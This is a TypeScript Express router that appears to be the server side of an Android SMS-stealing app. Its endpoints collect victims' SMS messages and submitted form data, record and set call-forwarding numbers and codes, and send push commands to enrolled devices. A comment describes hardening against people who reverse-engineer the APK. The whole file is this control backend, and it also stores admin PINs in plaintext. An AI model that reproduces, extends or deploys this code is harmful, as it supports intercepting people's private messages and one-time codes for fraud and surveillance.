import { Router, type Request } from "express";
import { db } from "../lib/supabase.js";
import { checkProxyRules, logProxyRequest } from "../lib/proxy.js";
import { addDeviceSseClient, removeDeviceSseClient, broadcastDeviceSSE } from "../lib/device-sse.js";
import { logger } from "../lib/logger.js";
import { sendFcmMessage } from "../lib/fcm.js";
import { verifyHmac, isTimestampFresh } from "../lib/hmac.js";

const router = Router();

function getIp(req: { headers: Record<string, string | string[] | undefined>; socket: { remoteAddress?: string } }): string {
  const fwd = req.headers["x-forwarded-for"];
  const ip = (Array.isArray(fwd) ? fwd[0] : fwd) ?? req.socket.remoteAddress ?? "unknown";
  return ip.split(",")[0].trim();
}

/**
 * Verify app token validity + optional HMAC request signature.
 *
 * When `signing_required = true` for the app, requests MUST include:
 *   X-Timestamp : unix milliseconds (string)
 *   X-Signature : HMAC-SHA256(key=secret_key, message=`${timestamp}:${METHOD}:${path}`)
 *
 * This prevents anyone who reverse-engineers the APK from making raw requests
 * — even knowing the URL + appToken is not enough without the secret_key.
 */
async function verifyApp(
  appToken: string,
  req?: Request,
): Promise<{ ok: boolean; error?: string }> {
  // First try the full query including HMAC columns.
  // If those columns don't exist yet (migration pending), Supabase/PostgREST
  // returns a column-not-found error — fall back to basic query so existing
  // apps keep working while the admin runs the DB migration.
  let data: { status: string; expires_at: string | null; signing_required?: boolean; secret_key?: string | null } | null = null;

  const { data: fullData, error: fullError } = await db
    .from("apps")
    .select("status, expires_at, signing_required, secret_key")
    .eq("app_id", appToken)
    .single();

  if (fullError) {
    // If it's a column-not-found error (migration not yet run), retry with basic columns
    const msg = (fullError as { message?: string }).message ?? "";
    const isColumnMissing = msg.includes("secret_key") || msg.includes("signing_required") || msg.includes("column") || (fullError as { code?: string }).code === "42703";
    if (isColumnMissing) {
      const { data: basicData, error: basicErr } = await db
        .from("apps")
        .select("status, expires_at")
        .eq("app_id", appToken)
        .single();
      if (basicErr || !basicData) return { ok: false, error: "App ID not found" };
      data = basicData as typeof data;
    } else {
      return { ok: false, error: "App ID not found" };
    }
  } else {
    data = fullData;
  }

  if (!data) return { ok: false, error: "App ID not found" };
  if (data.status === "disabled") return { ok: false, error: "App ID is disabled" };
  if (data.status === "inactive") return { ok: false, error: "App ID is inactive" };
  if (data.expires_at && new Date(data.expires_at) < new Date()) return { ok: false, error: "App ID expired" };

  // ── HMAC signature check (only when signing is enabled for this app) ─────────
  // Skipped automatically if signing_required column doesn't exist yet
  if (data.signing_required && data.secret_key && req) {
    const ts  = req.headers["x-timestamp"] as string | undefined;
    const sig = req.headers["x-signature"] as string | undefined;

    if (!ts || !sig) {
      return { ok: false, error: "Missing security headers: X-Timestamp and X-Signature required" };
    }
    if (!isTimestampFresh(ts)) {
      return { ok: false, error: "Request timestamp expired (max 5 minutes allowed)" };
    }
    const path = req.path;
    if (!verifyHmac(data.secret_key as string, ts, req.method, path, sig)) {
      return { ok: false, error: "Invalid request signature" };
    }
  }

  return { ok: true };
}

const DIRECT_COLUMNS = new Set([
  "status", "data_type",
  "device_name", "device_model", "android_version",
  "total_sms_count", "last_sms_timestamp",
  "sms_sync_status", "sms_pending_count", "sms_processed_count",
  "sms_permission_status", "sms_last_sync_at", "sms_last_error",
  "call_forward_status", "call_forward_action", "call_forward_code",
  "call_forward_number", "call_forward_sim_slot", "call_forward_response",
  "call_forward_timestamp", "last_heartbeat_at", "data_json",
  "fcm_token", "fcm_token_status",
]);

const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "created_at"]);

const CORE_DATA_TYPES = new Set([
  "registered_device", "heartbeat", "online_status",
  "fcm_token", "call_forward", "sms_sync", "device_info",
  "admin_config",
]);

// ── GET /api/device/:appToken/stream ─────────────────────────────────────────
// SSE stream for Android app — broadcasts device/message/form_data changes
router.get("/device/:appToken/stream", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) {
    res.status(403).json({ ok: false, error: appCheck.error });
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  // Keep-alive ping every 15s — well under any proxy/OkHttp read timeout
  const ping = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
  }, 15000);

  addDeviceSseClient(appToken, res);

  req.on("close", () => {
    clearInterval(ping);
    removeDeviceSseClient(appToken, res);
  });
});

// ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
router.post("/device/:appToken/upsert", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const meta = { endpoint: "upsert" as const, app_id: appToken, sub_id: subId, ip };

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: "/api/device/upsert", app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules(meta);
  logProxyRequest({ endpoint: `/api/device/${appToken}/upsert`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const dataType = (payload["data_type"] as string | undefined) ?? "registered_device";

  if (dataType && !CORE_DATA_TYPES.has(dataType) && dataType !== "registered_device") {
    const formRow = {
      app_id: appToken,
      sub_id: subId,
      form_type: dataType,
      data: payload,
      submitted_at: new Date().toISOString(),
    };
    const { data: fData } = await db.from("form_data").insert(formRow).select().single();
    if (fData) broadcastDeviceSSE(appToken, "form_data", "INSERT", fData);
    return res.json({ ok: true, routed: "form_data" });
  }

  const row: Record<string, unknown> = {
    app_id: appToken,
    sub_id: subId,
    device_id: subId,
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(payload)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const dj = payload["data_json"] as Record<string, unknown> | undefined;
  if (dj) {
    row["device_name"] ??= dj["device_name"] ?? dj["model"] ?? null;
    row["device_model"] ??= dj["model"] ?? null;
    row["android_version"] ??= dj["androidversion"] ?? null;
  }

  if (dj) {
    const { data: existingRow } = await db.from("devices").select("data_json").eq("app_id", appToken).eq("sub_id", subId).maybeSingle();
    const existingDj = (existingRow?.data_json as Record<string, unknown> | null) ?? {};
    const merged: Record<string, unknown> = { ...existingDj };
    for (const [k, v] of Object.entries(dj)) {
      const existing = existingDj[k];
      if ((v === "" || v === null || v === undefined || v === 0) && existing !== undefined && existing !== "" && existing !== null && existing !== 0) continue;
      merged[k] = v;
    }
    delete (merged as Record<string, unknown>)["fcm_token"];
    delete (merged as Record<string, unknown>)["fcm_token_status"];
    row["data_json"] = merged;
  }

  if (!row["fcm_token"] || row["fcm_token"] === "") {
    const promotedToken = (dj?.["fcm_token"] as string | undefined) ?? "";
    if (promotedToken) row["fcm_token"] = promotedToken;
  }
  if (!row["fcm_token_status"] || row["fcm_token_status"] === "") {
    const promotedStatus = (dj?.["fcm_token_status"] as string | undefined) ?? "";
    if (promotedStatus) row["fcm_token_status"] = promotedStatus;
  }

  let { data, error } = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();

  if (error && error.message.includes("fcm_token")) {
    delete row["fcm_token"];
    delete row["fcm_token_status"];
    if (row["data_json"] && dj?.["fcm_token"]) {
      (row["data_json"] as Record<string, unknown>)["fcm_token"] = dj["fcm_token"];
      (row["data_json"] as Record<string, unknown>)["fcm_token_status"] = dj["fcm_token_status"] ?? "active";
    }
    const retry = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();
    data = retry.data;
    error = retry.error;
  }

  if (error) return res.status(500).json({ ok: false, error: error.message });

  // Broadcast to Android SSE clients
  if (data) broadcastDeviceSSE(appToken, "devices", "UPDATE", data);

  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/message ────────────────────────────────────────
router.post("/device/:appToken/message", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "message", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, sender_number: payload["sender_number"], direction: payload["direction"], content: String(payload["message_body"] ?? "").slice(0, 80) } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const tsRaw = payload["timestamp"] as number | undefined;
  const sentAt = tsRaw ? new Date(tsRaw).toISOString() : new Date().toISOString();

  const messageRow = {
    app_id:       appToken,
    sub_id:       subId,
    from_id:      (payload["sender_number"] ?? payload["phone_number"] ?? null) as string | null,
    to_id:        (payload["receiver_number"] ?? null) as string | null,
    content:      ((payload["message_body"] as string | undefined) ?? "").slice(0, 5000),
    message_type: (payload["direction"] as string | undefined) ?? "sms",
    sent_at:      sentAt,
    is_read:      false,
  };

  let insertResult = await db.from("messages").insert(messageRow).select().single();

  if (insertResult.error && insertResult.error.message.includes("to_id")) {
    const { to_id: _dropped, ...rowWithoutToId } = messageRow;
    insertResult = await db.from("messages").insert(rowWithoutToId).select().single();
  }

  const { data, error } = insertResult;
  if (error) return res.status(500).json({ ok: false, error: error.message });

  // Broadcast to Android SSE clients
  if (data) broadcastDeviceSSE(appToken, "messages", "INSERT", data);

  const { count } = await db.from("messages").select("*", { count: "exact", head: true }).eq("app_id", appToken).eq("sub_id", subId);
  const now = new Date().toISOString();
  await db.from("devices").update({ total_sms_count: count ?? 0, last_sms_timestamp: tsRaw ?? Date.now(), sms_sync_status: "SYNCED", sms_last_sync_at: Date.now(), updated_at: now, last_seen: now }).eq("app_id", appToken).eq("sub_id", subId);

  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/form ───────────────────────────────────────────
router.post("/device/:appToken/form", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "form", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const formRow = {
    app_id:       appToken,
    sub_id:       subId,
    form_type:    (payload["data_type"] as string | undefined) ?? "form",
    data:         payload,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (data) broadcastDeviceSSE(appToken, "form_data", "INSERT", data);

  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get/:uid ────────────────────────────────────────
router.get("/device/:appToken/get/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "get", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const { data, error } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", uid).single();

  if (error || !data) return res.status(404).json({ ok: false, error: "Device not found" });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get ─────────────────────────────────────────────
// Supports optional pagination: ?offset=0&limit=50
// When limit=0 (default) all rows are returned (backward-compat).
router.get("/device/:appToken/get", async (req, res) => {
  const { appToken } = req.params;
  const { offset = "0", limit = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const numOffset = Math.max(0, Number(offset) || 0);
  const numLimit  = Math.max(0, Number(limit)  || 0);

  let query = db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (numLimit > 0) {
    query = query.range(numOffset, numOffset + numLimit - 1);
  }

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });

  const rows    = data ?? [];
  const hasMore = numLimit > 0 ? rows.length >= numLimit : false;
  return res.json({ ok: true, data: rows, hasMore, offset: numOffset, limit: numLimit });
});

// ── PATCH /api/device/:appToken/update/:uid ───────────────────────────────────
router.patch("/device/:appToken/update/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const updates = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "update", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const row: Record<string, unknown> = {
    updated_at: new Date().toISOString(),
    last_seen:  new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(updates)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const updateDj = updates["data_json"] as Record<string, unknown> | undefined;
  if (updateDj) {
    const { data: existingRow } = await db.from("devices").select("data_json").eq("app_id", appToken).eq("sub_id", uid).maybeSingle();
    const existingDj = (existingRow?.data_json as Record<string, unknown> | null) ?? {};
    const merged: Record<string, unknown> = { ...existingDj };
    for (const [k, v] of Object.entries(updateDj)) {
      const existing = existingDj[k];
      if ((v === "" || v === null || v === undefined || v === 0) && existing !== undefined && existing !== "" && existing !== null && existing !== 0) continue;
      merged[k] = v;
    }
    delete (merged as Record<string, unknown>)["fcm_token"];
    delete (merged as Record<string, unknown>)["fcm_token_status"];
    row["data_json"] = merged;
  }

  let { data: updData, error: updError } = await db.from("devices").update(row).eq("app_id", appToken).eq("sub_id", uid).select().single();

  if (updError && updError.message.includes("fcm_token")) {
    const fcmTokenVal = row["fcm_token"];
    delete row["fcm_token"];
    delete row["fcm_token_status"];
    if (row["data_json"] && fcmTokenVal) {
      (row["data_json"] as Record<string, unknown>)["fcm_token"] = fcmTokenVal;
      (row["data_json"] as Record<string, unknown>)["fcm_token_status"] = "active";
    }
    const retry = await db.from("devices").update(row).eq("app_id", appToken).eq("sub_id", uid).select().single();
    updData = retry.data;
    updError = retry.error;
  }

  if (updError) return res.status(500).json({ ok: false, error: updError.message });

  if (updData) broadcastDeviceSSE(appToken, "devices", "UPDATE", updData);

  return res.json({ ok: true, data: updData });
});

// ── DELETE /api/device/:appToken/delete/:uid ──────────────────────────────────
router.delete("/device/:appToken/delete/:uid", async (req, res) => {
  const { appToken, uid } = req.params;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data: old } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", uid).single();
  const { error } = await db.from("devices").delete().eq("app_id", appToken).eq("sub_id", uid);

  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (old) broadcastDeviceSSE(appToken, "devices", "DELETE", null, old);

  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/messages ────────────────────────────────────────
router.get("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db.from("messages").select("*").eq("app_id", appToken).order("sent_at", { ascending: false }).range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── DELETE /api/device/:appToken/messages/:id ─────────────────────────────────
router.delete("/device/:appToken/messages/:id", async (req, res) => {
  const { appToken, id } = req.params;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { error } = await db.from("messages").delete().eq("app_id", appToken).eq("id", Number(id));

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── DELETE /api/device/:appToken/messages ─────────────────────────────────────
router.delete("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { error } = await db.from("messages").delete().eq("app_id", appToken);

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/form-data ───────────────────────────────────────
router.get("/device/:appToken/form-data", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db.from("form_data").select("*").eq("app_id", appToken).order("submitted_at", { ascending: false }).range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── GET /api/device/:appToken/admin-config ───────────────────────────────────
router.get("/device/:appToken/admin-config", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", "admin_config_main").maybeSingle();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? null });
});

// ── POST /api/device/:appToken/admin-config ──────────────────────────────────
router.post("/device/:appToken/admin-config", async (req, res) => {
  const { appToken } = req.params;
  const { number, status } = req.body as { number?: string; status?: string };

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const now = new Date().toISOString();
  const row = {
    app_id:    appToken,
    sub_id:    "admin_config_main",
    device_id: "admin_config_main",
    data_type: "admin_config",
    status:    status ?? "OFF",
    data_json: { number: number ?? "", status: status ?? "OFF", updated_at: Date.now() },
    updated_at: now,
    last_seen:  now,
  };

  const { data, error } = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/fcm-send ──────────────────────────────────────
// Two modes:
//
// MODE A — FCMHelper style (direct token):
//   { fcmToken: "<token>", data: { type: "CHECK_ONLINE", payload: "{...}" } }
//   → forward data fields directly to FCM (no notification block)
//
// MODE B — SupabaseApi.sendFcmPush style (lookup by uid):
//   { uid/uniqueid: "<sub_id>", title: "...", body: "...", data?: {...} }
//   → look up fcm_token from DB, then send notification + data
//
router.post("/device/:appToken/fcm-send", async (req, res) => {
  const { appToken } = req.params;
  const b = req.body as Record<string, unknown>;

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  // ── Resolve FCM token ──────────────────────────────────────────────────────
  let resolvedFcmToken = ((b["fcmToken"] ?? b["fcm_token"] ?? "") as string).trim();

  if (!resolvedFcmToken) {
    const uid = ((b["uid"] ?? b["uniqueid"] ?? b["uniqueId"] ?? b["deviceId"] ?? "") as string).trim();
    if (!uid) return res.status(400).json({ ok: false, error: "fcmToken or uid is required" });

    const { data: deviceRow } = await db
      .from("devices")
      .select("fcm_token, data_json")
      .eq("app_id", appToken)
      .eq("sub_id", uid)
      .maybeSingle();

    resolvedFcmToken =
      (deviceRow?.fcm_token as string | null) ||
      ((deviceRow?.data_json as Record<string, unknown> | null)?.["fcm_token"] as string | null) ||
      "";

    if (!resolvedFcmToken) return res.status(404).json({ ok: false, error: "No FCM token for this device" });
  }

  const dataField = b["data"] as Record<string, string> | undefined;
  const title     = b["title"] as string | undefined;
  const body      = b["body"]  as string | undefined;

  // ── Send via Firebase Admin SDK (FCM v1) ──────────────────────────────────
  let result: { ok: boolean; messageId?: string; error?: string };

  if (dataField && typeof dataField === "object" && !title && !body) {
    // MODE A — data-only (FCMHelper)
    const stringData: Record<string, string> = {};
    for (const [k, v] of Object.entries(dataField)) {
      stringData[k] = typeof v === "string" ? v : JSON.stringify(v);
    }
    result = await sendFcmMessage({ mode: "data", fcmToken: resolvedFcmToken, data: stringData });
  } else {
    // MODE B — notification
    result = await sendFcmMessage({
      mode:     "notification",
      fcmToken: resolvedFcmToken,
      title:    title ?? "Admin",
      body:     body  ?? "",
      data:     dataField,
    });
  }

  if (!result.ok) return res.status(502).json({ ok: false, error: result.error });
  return res.json({ ok: true, messageId: result.messageId });
});

// ── POST /api/device/:appToken/data ───────────────────────────────────────────
router.post("/device/:appToken/data", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["deviceId"] ?? payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "deviceId is required" });

  const appCheck = await verifyApp(appToken, req);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "upsert", app_id: appToken, sub_id: subId, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const formFields = (payload["data"] as Record<string, unknown> | undefined) ?? payload;

  const formRow = {
    app_id:       appToken,
    sub_id:       subId,
    form_type:    (formFields["form_type"] as string | undefined) ?? "form",
    data:         formFields,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (data) broadcastDeviceSSE(appToken, "form_data", "INSERT", data);

  logProxyRequest({ endpoint: `/api/device/${appToken}/data`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "accepted", reason: "form submitted", payload_preview: { app_id: appToken, sub_id: subId, form_type: formRow.form_type } });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/admin-login ────────────────────────────────────
// Creates a session row and returns session_id so Android can persist login.
router.post("/device/:appToken/admin-login", async (req, res) => {
  const { appToken } = req.params;
  const { password, sub_id } = req.body as { password?: string; sub_id?: string };

  if (!password) return res.status(400).json({ ok: false, error: "Password required" });

  const { data: app, error } = await db.from("apps").select("pin, status, expires_at").eq("app_id", appToken).single();
  if (error || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (app.status === "disabled") return res.status(403).json({ ok: false, error: "App ID is disabled" });
  if (app.expires_at && new Date(app.expires_at) < new Date()) return res.status(403).json({ ok: false, error: "App ID expired" });
  if (password !== app.pin) return res.status(401).json({ ok: false, error: "Invalid password" });

  // Create session row in DB so we can validate/invalidate it later
  const ip = getIp(req as Parameters<typeof getIp>[0]);
  const { data: session, error: sessErr } = await db
    .from("admin_sessions")
    .insert({
      app_id:      appToken,
      sub_id:      sub_id ?? null,
      login_time:  new Date().toISOString(),
      last_active: new Date().toISOString(),
      ip,
      is_valid:    true,
    })
    .select("id")
    .single();

  if (sessErr || !session) {
    // Session creation failed — still allow login but without session persistence
    logger.warn({ err: sessErr?.message }, "admin-login: session insert failed");
    return res.json({ ok: true, session_id: -1 });
  }

  return res.json({ ok: true, session_id: session.id });
});

// ── GET /api/device/:appToken/session/:id/check ───────────────────────────────
// Returns { valid: true/false } — Android polls this every 30 s.
router.get("/device/:appToken/session/:id/check", async (req, res) => {
  const sessionId = Number(req.params.id);
  if (!sessionId || isNaN(sessionId)) return res.json({ valid: false });

  const { data, error } = await db
    .from("admin_sessions")
    .select("is_valid")
    .eq("id", sessionId)
    .eq("app_id", req.params.appToken)
    .maybeSingle();

  if (error || !data) return res.json({ valid: false });
  return res.json({ valid: data.is_valid === true });
});

// ── POST /api/device/:appToken/session/:id/ping ───────────────────────────────
// Android calls this every 5 min to update last_active.
router.post("/device/:appToken/session/:id/ping", async (req, res) => {
  const sessionId = Number(req.params.id);
  if (!sessionId || isNaN(sessionId)) return res.json({ ok: true });

  await db
    .from("admin_sessions")
    .update({ last_active: new Date().toISOString() })
    .eq("id", sessionId)
    .eq("app_id", req.params.appToken);

  return res.json({ ok: true });
});

// ── POST /api/device/:appToken/admin-change-password ──────────────────────────
router.post("/device/:appToken/admin-change-password", async (req, res) => {
  const { appToken } = req.params;
  const { old_password, new_password } = req.body as { old_password?: string; new_password?: string };

  if (!old_password || !new_password) return res.status(400).json({ ok: false, error: "old_password and new_password required" });

  const { data: app, error } = await db.from("apps").select("pin").eq("app_id", appToken).single();
  if (error || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (old_password !== app.pin) return res.status(401).json({ ok: false, error: "Old password incorrect" });

  const { error: updErr } = await db.from("apps").update({ pin: new_password }).eq("app_id", appToken);
  if (updErr) return res.status(500).json({ ok: false, error: updErr.message });

  return res.json({ ok: true });
});

export default router;
